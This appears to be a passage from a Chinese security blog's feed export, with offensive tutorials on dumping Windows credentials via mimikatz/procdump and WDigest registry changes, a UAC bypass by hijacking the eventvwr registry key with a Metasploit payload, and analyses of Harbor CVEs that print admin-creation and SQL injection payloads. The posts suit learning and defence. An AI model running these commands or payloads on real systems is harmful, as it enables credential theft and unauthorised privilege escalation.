<h2 id="0x02-散列值获取方法"><a href="#0x02-散列值获取方法" class="headerlink" title="0x02 散列值获取方法"></a>0x02 散列值获取方法</h2><p>要想在Windows操作系统中抓取散列值或明文密码，必须将权限升级至System。本地用户名，散列值和其它安全验证信息都保存在SAM文件中。lsass.exe进程(它用于本地安全和登陆策略)用于实现Windows的安全策略，可以使用工具将散列值和明文密码从内存中的lsass.exe进程或SAM文件中导出。</p>
<p>利用前提：拿到了管理员权限的cmd，管理员用密码登录过机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。</p>
<p>在<strong>KB2871997</strong>之前， 使用 Mimikatz 可以直接抓取明文密码。</p>
<p>当服务器安装 <strong>KB2871997</strong> 补丁后，系统默认禁用 Wdigest Auth（<strong>Windows 2012及以上版本</strong>） ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>    但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）之后通过手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 &#x3D; 截取明文密码</p>
<h3 id="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"><a href="#使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）" class="headerlink" title="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"></a>使用mimikatz在线读取SAM文件（目标没有杀软，或者<code>mimikatz</code>已免杀）</h3><p>直接将<code>mimikatz</code>上传至目标机器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;    #在线读取散列值及铭文密码</span><br></pre></td></tr></table></figure>

<p>该操作需要管理员权限，否则报错，无法读取密码，报错信息如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221939.png" alt="image-20210207221937863"></p>
<p>管理员权限执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221945.png" alt="image-20210207221846491"></p>
<h4 id="使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）"><a href="#使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）" class="headerlink" title="使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）"></a>使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）</h4><p>（1）导出<code>lsass.dmp</code>文件</p>
<p>通过 <code>procdump.exe</code> 文件导出<code>lsass.dmp</code>文件（Procdump是微软官方发布的工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截）</p>
<p><code>procdump</code>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
<p><strong>管理员权限运行</strong>该命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207215155.png" alt="image-20210207214123607"></p>
<p>(2）使用mimikatz导出lsass.dmp文件中的密码散列值</p>
<p>将目标机器上的 <code>lsass.tmp</code> 拉取到本地，与<code>mimikatz</code>同目录，使用<code>mimikatz</code>解密目标系统密码。（本地机器需与目标机器的版本位数一致）</p>
<p>运行mimikatz.exe 解密该文件。注：32位就用32位的<code>mimikatz</code>破解，同理64位的也是。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207213854.png" alt="image-20210207213852318"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207214737.png" alt="image-20210207214733408"></p>
<h4 id="mimikatz无法读取到密码时"><a href="#mimikatz无法读取到密码时" class="headerlink" title="mimikatz无法读取到密码时"></a>mimikatz无法读取到密码时</h4><p>在默认情况下，当系统为<strong>Windows 2012R2</strong>以上或者安装 <strong>KB2871997</strong> 补丁时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。</p>
<p><strong>开启Wdigest Auth</strong></p>
<ul>
<li><p>cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
</li>
<li><p>powershell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>meterpreter</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>关闭Wdigest Auth</strong></p>
<p>关闭命令如下：</p>
<ul>
<li><p>cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
</li>
<li><p>powershell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>meterpreter</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>强制锁屏</strong></p>
<p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能抓明文密码。</p>
<p>强制锁屏，让管理员重新登录。</p>
<ul>
<li><p>cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>

<p>等待管理员重新登录，之后重新读取，可读到明文密码。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows提权</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows提权-BypassUAC之劫持注册表实验</title>
    <url>/2021/01/19/Windows%E6%8F%90%E6%9D%83-BypassUAC%E4%B9%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<blockquote>
<p>  准备PPT的过程中，还是学到不少东西的</p>
</blockquote>
<h3 id="1-UAC-简介"><a href="#1-UAC-简介" class="headerlink" title="1. UAC 简介"></a>1. UAC 简介</h3><p>**UAC(User Account Control，用户账号控制)**是微软为了提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。</p>
<p>在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。在权限不够的情况下，访问系统磁盘的根目录( 例如 C:\)、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证，如图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084909.png" alt="image-20210118155254114"></p>
<p><strong>需要UAC的授权才能进行的操作列表如下：</strong></p>
<ul>
<li>配置Windows Update</li>
<li>增加、删除账户</li>
<li>更改账户类型</li>
<li>更改UAC的设置</li>
<li>安装ActiveX</li>
<li>安装、卸载程序</li>
<li>安装设备驱动程序</li>
<li>将文件移动&#x2F;复制到Program Files或Windows目录下</li>
<li>查看其它用户的文件夹</li>
<li>…</li>
</ul>
<p><strong>UAC有如下四种设置要求：</strong></p>
<ul>
<li><p>始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户</p>
</li>
<li><p>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</p>
</li>
<li><p>仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</p>
</li>
<li><p>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084914.png" alt="image-20210119212303742"></p>
</li>
</ul>
<h3 id="2-利用系统自带的UAC白名单程序提权"><a href="#2-利用系统自带的UAC白名单程序提权" class="headerlink" title="2. 利用系统自带的UAC白名单程序提权"></a>2. 利用系统自带的UAC白名单程序提权</h3><p>用户账户控制限制着程序使用高级权限才能进行的操作，但是，UAC同样也会对系统本身的程序造成影响，微软也不希望运行系统程序也需要询问用户，因为系统程序是安全的。因此，微软则在 UAC 中添加了白名单机制，即在系统中记录有一张表单，表单中的系统程序，将不限制其直接提升到管理员权限。 系统中的白名单程序有多个，其中，msconfig、taskmgr、perfmon、cleanmgr 等平时常用的程序都在其中。操作系统的UAC白名单程序，默认以管理员权限运行，而且不弹出UAC窗口确认。这些白名单程序，都具有微软的签名是操作系统可信的。</p>
<p>所以我们可以找一些以高权限运行的，但是并没有uac提示的进程，然后利用ProcessMonitor寻找他启动调用却缺失的如dll、注册表键值，然后我们添加对应的值达到bypass uac的效果。</p>
<p>以高权限运行的进程图标一般有如下标志：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084919.png" alt="image-20210119104903074"></p>
<h3 id="3-怎么找这些白名单程序"><a href="#3-怎么找这些白名单程序" class="headerlink" title="3. 怎么找这些白名单程序"></a>3. 怎么找这些白名单程序</h3><p>白名单程序都有一个特性，就是它们都具有autoElevate属性，该属性可由特定工具查看。</p>
<p>利用微软自带工具检测程序是否具有autoElevate属性，以eventvwr.exe为例，该程序位于C:\Windows\System32目录下。使用微软的Sigcheck工具去查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sigcheck.exe：https://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sigcheck64.exe -m C:\Windows\System32\eventvwr.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084934.png" alt="image-20210119143254956"></p>
<p>利用(Strings.exe](<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)%E5%B7%A5%E5%85%B7%E6%89%BE%E5%87%BA%E6%89%80%E6%9C%89%E5%85%B7%E6%9C%89autoElevate%E5%B1%9E%E6%80%A7%E7%9A%84%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%B0%86strings.exe%E6%94%BE%E5%9C%A8C:/Windows/System32%E7%9B%AE%E5%BD%95%E4%B8%8B">https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)工具找出所有具有autoElevate属性的程序，将strings.exe放在C:\Windows\System32目录下</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings.exe -s *.exe | findstr /i autoelevate</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084950.png" alt="image-20210119144326844"></p>
<p>系统在调用这些高权限程序时，会调用<code> HKCR（ HKEY_CLASSES_ROOT）</code>下的键值。 所以，修改<code> HKCR（ HKEY_CLASSES_ROOT）</code>下的键值，把原本的键值改为 cmd.exe 等 shell 程序。如果高权限的程序，在运行过程中调用此处被修改过的键值，就会以高权限启动我们设定的程序。从而实现绕过 UAC提权。难点在于找到注册表的关键位置。</p>
<h3 id="4-如何找对应的注册表？以事件查看器（eventvwr-为例"><a href="#4-如何找对应的注册表？以事件查看器（eventvwr-为例" class="headerlink" title="4. 如何找对应的注册表？以事件查看器（eventvwr)为例"></a>4. 如何找对应的注册表？以事件查看器（eventvwr)为例</h3><p>接下来使用 <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon">Process Monitor</a> 工具来查看eventvwr运行时，会调用哪些文件、查询哪些注册表地址。（win7 上无法使用 提示： unable to load Process Monitor device driver，需要更新下面这个补丁即可：<a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148%EF%BC%89">https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148）</a></p>
<p>1、打开Process Monitor工具后，设置过滤规则，选择工具栏”Filter” &#x3D;&#x3D;&gt; “Filter…”</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085000.png" alt="image-20210119160455408"></p>
<p>设置过滤规则，”Process Name” “is” “eventvwr.exe”，然后点击Add添加规则，之后点击Apply应用和OK即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085005.png" alt="image-20210119160612340"></p>
<p>运行eventvwr.exe，之后查看Process Monitor ，会出现一堆东西，而且右键Properties 可以看到<code>eventvwr.exe</code>权限为 <code>high</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085012.png" alt="image-20210119161656625"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085019.png" alt="image-20210119164141166"></p>
<p>难点就在于从这一堆东西中找到注册表的关键位置，这里我也并不熟悉，通过查找搜索，发现关键点为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Classes\mscfile\shell\open\command</span><br><span class="line">HKCR\mscfile\shell\open\command</span><br></pre></td></tr></table></figure>

<p>在进程 <code>eventvwr.exe</code> 启动的时候，首先查找注册表位置 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>。如果该处为空，接着查找注册表位置 <code>HKCR\mscfile\shell\open\command</code>(此处默认值为 <code>%SystemRoot%\system32\mmc.exe &quot;%1&quot; %*</code>)，以高权限启动 <code>mmc.exe</code>，最后打开 <code>eventvwr.msc</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085025.png" alt="image-20210119211043232"></p>
<p>这里由结果向原因推导：发现关键字，<code>shell</code> 、<code>command</code> </p>
<p>搞站不就是拿shell，执行命令，这里不就是执行命令的点吗？！</p>
<h4 id="4-1-测试"><a href="#4-1-测试" class="headerlink" title="4.1 测试"></a>4.1 测试</h4><p>如果修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，使其查询结果为 <code>SUCCESS</code>，会如何呢？</p>
<p>首先需要修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，为测试可以把值改为 <code>calc.exe</code>， 打开运行，执行regedit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注册表内：</span><br><span class="line">    HKCU = HKEY_CURRENT_USER</span><br><span class="line">    HKLM = HKEY_LOCAL_MACHINE</span><br><span class="line">    HKCR = HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure>

<p>在Win7 中 我这里的 <code>regedit</code> 中的键值只到 <code>HKCU\Software\Classes\</code> 这层目录，所以我新增了后面的表项，并把值设为 <code>C:\Windows\System32\calc.exe</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085030.png" alt="image-20210119163817241"></p>
<p>再重新启动<code>eventvwr.exe</code>，成功弹出计算器</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085036.png" alt="image-20210119163926939"></p>
<p>并且使用Process Monitor 查看权限，也是<code>high</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085040.png" alt="image-20210119164604806"></p>
<p>而正常启动计算器</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085048.png" alt="image-20210119164803238"></p>
<p>实验成功，成功绕过 UAC。</p>
<h4 id="4-2-实战"><a href="#4-2-实战" class="headerlink" title="4.2 实战"></a>4.2 实战</h4><p>修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，为msf生成的exe，之后运行<code>eventvwr.exe</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085055.png" alt="image-20210119165643571"></p>
<p>一句话修改注册表，将<code>d:\1.exe</code>改为msf的exe地址，复制到命令行执行即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d d:\1.exe /f   <span class="comment">#1.exe为msf马</span></span><br></pre></td></tr></table></figure>

<p>如果直接执行shell.exe，反弹回来的会话不能通过getsystem直接提权，因为会被UAC拦截</p>
<p><img src="/images/image-20210119171432120.png" alt="image-20210119171432120"></p>
<p>劫持注册表后，再次执行eventvwr，程序就会去查找劫持的注册表地址，然后以自动提权之后的管理员权限加载shell.exe，此时反弹回来的会话可通过getsystem直接提权</p>
<p><img src="/images/image-20210119170019046.png" alt="image-20210119170019046"></p>
<p>最后记得清除注册表项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，执行eventvwr命令时才会去注册表查找mmc.exe的路径，如果执行的是mmc.exe eventvwr.msc，直接加载mmc.exe，是不会去查询注册表的。</p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows提权</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>harbor历史漏洞分析</title>
    <url>/2023/02/18/harbor%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>  今年多写文章，先把去年的清理一下</p>
</blockquote>
<h1 id="Harbor"><a href="#Harbor" class="headerlink" title="Harbor"></a>Harbor</h1><p>Harbor是VMware公司开源的企业级Docker Registry项目，用来帮助用户迅速搭建一个企业级的Docker Registry服务。</p>
<p>它以Docker公司开源的registry为基础，提供了管理UI，基于角色的访问控制(Role Based Access Control)，AD&#x2F;LDAP集成、以及审计日志(Auditlogging) 等企业用户需求的功能，同时还原生支持中文。</p>
<h1 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h1><h2 id="CVE-2019-16097"><a href="#CVE-2019-16097" class="headerlink" title="CVE-2019-16097"></a>CVE-2019-16097</h2><p>漏洞版本 1.7.0 to 1.7.5 and 1.8.0 to 1.8.2</p>
<blockquote>
<p>Harbour 1.7.0 到 1.8.2 中的 <code>core/api/user.go</code> 允许非管理员用户通过 POST <code>/api/users</code> API 创建管理员帐户</p>
</blockquote>
<p>相关代码，直接解析传来的数据</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224677.png" alt="image-20221019141407512"></p>
<p>正常注册数据</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;test123@gmai.com&quot;</span><span class="punctuation">,</span><span class="attr">&quot;realname&quot;</span><span class="punctuation">:</span><span class="string">&quot;noname&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;Password1@11&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>非预期：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;test123@gmai.com&quot;</span><span class="punctuation">,</span><span class="attr">&quot;realname&quot;</span><span class="punctuation">:</span><span class="string">&quot;noname&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;Password1@11&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;has_admin_role&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>has_admin_role</code> 代表是否为管理员，直接创建管理员用户</p>
<p>修复代码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224489.png" alt="image-20221019141923017"></p>
<h2 id="CVE-2019-16919"><a href="#CVE-2019-16919" class="headerlink" title="CVE-2019-16919"></a>CVE-2019-16919</h2><p>漏洞版本：1.8.0 to 1.8.3 and 1.9.0</p>
<blockquote>
<p>该漏洞允许项目管理员使用 Harbor API 创建一个机器人帐户，该帐户对他们无权访问或控制的项目具有未经授权的推送或拉取访问权限。Harbor API 没有对 API 请求强制执行适当的项目权限和项目范围以创建新的机器人帐户。</p>
</blockquote>
<p><code>src/core/api/robot.go</code>对比，就是加了一个判断，需要管理员创建没啥说的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224173.png" alt="image-20221019144856634"></p>
<p><a href="https://github.com/goharbor/harbor/commit/debf63bcbd17bbeacb4a354de0457684f4ecaa5a">https://github.com/goharbor/harbor/commit/debf63bcbd17bbeacb4a354de0457684f4ecaa5a</a></p>
<h2 id="CVE-2019-19023"><a href="#CVE-2019-19023" class="headerlink" title="CVE-2019-19023"></a>CVE-2019-19023</h2><p>漏洞版本 1.7.*, 1.8.*, &lt; 1.9.3</p>
<blockquote>
<p>  该漏洞允许普通用户通过调用 API 来修改特定用户的电子邮件地址，从而获得管理员帐户权限。之后重置该电子邮件地址的密码并访问该帐户。</p>
</blockquote>
<p><code>src/core/api/user.go</code>修复前后对比</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224226.png" alt="image-20221019163318792"></p>
<p>修复前是先赋值，后将用户输入转换为 json，这时 <code>userID</code> 就会被覆盖修改为用户输入的 id，可控，这样就可以修改管理员的邮箱，之后再进行重置密码操作，登录管理员；</p>
<p>修复后是先转换，后赋值，<code>userID</code>还是当前登录用户的id，不可控；</p>
<h2 id="cve-2019-xxx"><a href="#cve-2019-xxx" class="headerlink" title="cve-2019-xxx"></a>cve-2019-xxx</h2><p>CVE-2019-3990、CVE-2020-13794 非管理员可以进行用户名枚举,</p>
<p>CVE-2019-19025 没有 csrf 保护</p>
<p>CVE-2019-19030 未授权信息探测</p>
<p>1.7.*, 1.8.*, 1.9.*, &lt;2.0.1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/api/chartrepo/&#123;repo&#125;/prov (POST)</span><br><span class="line">/api/chartrepo/&#123;repo&#125;/charts (GET, POST)</span><br><span class="line">/api/chartrepo/&#123;repo&#125;/charts/&#123;name&#125; (GET, DELETE)</span><br><span class="line">/api/chartrepo/&#123;repo&#125;/charts/&#123;name&#125;/&#123;version&#125; (GET, DELETE)</span><br><span class="line">/api/labels?name=&#123;name&#125;&amp;scope=p (GET)</span><br><span class="line">/api/repositories?project_id=&#123;id&#125; (GET)</span><br><span class="line">/api/repositories/&#123;repo_name&#125;/ (GET, PUT, DELETE)</span><br><span class="line">/api/repositories/&#123;repo_name&#125;/tags (GET)</span><br><span class="line">/api/repositories/&#123;repo_name&#125;/tags/&#123;tag&#125;/manifest?version=&#123;version&#125; (GET)</span><br><span class="line">/api/repositories/&#123;repo_name/&#123;tag&#125;/labels (GET)</span><br><span class="line">/api/projects?project_name=&#123;name&#125; (HEAD)</span><br><span class="line">/api/projects/&#123;project_id&#125;/summary (GET)</span><br><span class="line">/api/projects/&#123;project_id&#125;/logs (GET)</span><br><span class="line">/api/projects/&#123;project_id&#125; (GET, PUT, DELETE)</span><br><span class="line">/api/projects/&#123;project_id&#125;/metadatas (GET, POST)</span><br><span class="line">/api/projects/&#123;project_id&#125;/metadatas/&#123;metadata_name&#125; (GET, PUT)</span><br></pre></td></tr></table></figure>



<h2 id="CVE-2019-19026"><a href="#CVE-2019-19026" class="headerlink" title="CVE-2019-19026"></a>CVE-2019-19026</h2><p>漏洞版本： 1.7.*、&lt;1.8.6、&lt;1.9.3</p>
<blockquote>
<p>  Harbor API的配额部分中存在SQL注入漏洞。经过身份验证的管理员可以通过GET参数排序发送巧尽心思构建的SQL负载，从而允许从数据库中提取敏感信息。</p>
<p>  Ps : 官方版本说的根本不对，quota_usage 这个文件 1.9.0 才出现</p>
</blockquote>
<p><code>git checkout v1.9.0</code></p>
<p><code>src/common/dao/quota.go</code> </p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224706.png" alt="image-20221024105920943"></p>
<p>Payload </p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://xxxxxx/api/quotas?reference=project&amp;page=1&amp;page_size=15&amp;sort=used.count%27%7C%7C(case+when+version()like+%27Postgre%25%27+then+1+else+(select+1+union+select+2)+end)%7C%7C%27</span><br></pre></td></tr></table></figure>

<h3 id="CodeQL"><a href="#CodeQL" class="headerlink" title="CodeQL"></a>CodeQL</h3><p>生成数据库<code>codeql database create ./harbor1.9.0 -s /Users/yhy/Documents/CloudNative/harbor/code/harbor/src --language=go</code> ps: 要指定源文件为 src 目录下，虽然上级目录有 makefile，但生成时没有运行 makefile，导致生成后的数据库有问题,sink 点缺失很多。</p>
<p>还有就是 Harbor 使用的是<code>beego</code>框架，该框架有两个版本，Codeql 中的<code>BeegoOrm</code>只写了一种，在<code>go/ql/lib/semmle/go/frameworks/BeegoOrm.qll</code>添加如下代码:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182224894.png" alt="image-20221201200001309"></p>
<p>使用官方的<code>ql/src/Security/CWE-089/SqlInjection.ql</code>查询规则，sink 和 source 单独都能跑出来，但是结合到一起，无法找出注入点，经分析大概是因为<code>...</code>造成数据流中断</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182225738.png" alt="image-20221025221621454"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Auth Chris Smowton</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">private predicate <span class="title function_">isVarargsParam</span><span class="params">(Parameter p)</span> &#123;</span><br><span class="line">  exists(ParameterDecl pd, FuncTypeExpr tp | pd = tp.getAParameterDecl() |</span><br><span class="line">    p.getDeclaration() = pd.getANameExpr() and</span><br><span class="line">    pd.getTypeExpr() instanceof Ellipsis</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaintConfig</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">  TaintConfig() &#123; this = <span class="string">&quot;taint-configuration&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node source, DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Parameter p, DataFlow::ArgumentNode an, <span class="type">int</span> idx |</span><br><span class="line">      an = source and</span><br><span class="line">      p = an.getCall().getACallee().getAParameter() and</span><br><span class="line">      isVarargsParam(p) and</span><br><span class="line">      not an.getCall().hasEllipsis() and</span><br><span class="line">      an.argumentOf(_, idx) and</span><br><span class="line">      idx &gt;= p.getIndex() and</span><br><span class="line">      sink.asParameter() = p</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样虽然可以跟踪隐式数组，但只有当数组本身为污染源才行，对其内的某个元素不起作用。</p>
<h2 id="CVE-2019-19029"><a href="#CVE-2019-19029" class="headerlink" title="CVE-2019-19029"></a>CVE-2019-19029</h2><p>漏洞版本： 1.7.*、&lt;1.8.6、&lt;1.9.3</p>
<blockquote>
<p>具有项目管理能力的用户可以利用和利用SQL注入从底层数据库读取机密或执行权限提升。</p>
</blockquote>
<p><code>src/core/auth/authproxy/auth.go</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182225446.png" alt="image-20221026105816087"></p>
<p><code>src/common/dao/group/usergroup.go</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226507.png" alt="image-20221026110058779"></p>
<p>这个问题看代码是当用户验证为<code>AuthProxy/OIDC</code>时，控制请求返回值构造 sql 注入 </p>
